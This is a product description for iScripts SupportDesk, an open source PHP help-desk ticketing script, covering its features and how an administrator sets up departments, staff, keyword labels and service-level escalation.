## Online Trouble Ticket Software

This customizable, open source script comes with a number of rich, built-in features to keep yourself and your staff organized while satisfying your customers. Users submit tickets by email or web form and receive an email when the ticket has been updated or closed. Communicate with your customers in a number of ways including remote desktop sharing, ticket creation, live chat, a custom knowledgebase and news section. Use the integrated workflow and service-level agreement features to ensure organized and timely support.

iScripts SupportDesk is a scalable and stable software offering everything you need to sufficiently handle customer service efforts for your business. Programming experience is not required in order to use this system.

After your one-time purchase, the script can be installed on your server to begin providing excellent customer service and solutions. From this point, you have complete control over the script and your site as the site administrator. This is an open source script without code encryption which means you may customize the site at any time in order to fit specific site needs. Integrate the iScripts SupportDesk script into an existing site or create a standalone full-featured platform. This script is implemented using PHP and Flex with a MySQL backend.

## Starting An Online Support Desk

Organizing customers, contact information, questions, trouble tickets and issues can become quite difficult for businesses and IT departments. As the site administrator of iScripts SupportDesk, you will be able to configure site operation as well as add your company logo, content, and existing client information within minutes. If applicable, your staff members will have a login for easy access to the platform in order to respond to and address tickets. Users can submit tickets quickly by supplying their email, or by completing a thorough sign up process.

## Setting Up Your Help Desk

Once installed on a server and domain of your choice, iScripts SupportDesk can be quickly set up to support your business. Customize the software to support staff members and specific departments (such as "Sales" or "Support"). You can also add your own labels which will define the subject of a ticket by detecting specific keywords. Users can login to their account to access a built-in knowledgebase system or submit a ticket. To accommodate customers, questions can also be submitted quickly by bypassing login and supplying just an email. You determine which staff members are assigned to tickets, departments and keywords. Along with this, the service-level agreement feature will ensure that all tickets are answered within a specified amount of time. If not, the ticket will be automatically escalated. If you decide to change or add any features to your help desk system, you can contact the team at iScripts or use your own PHP programmer to directly modify the software.
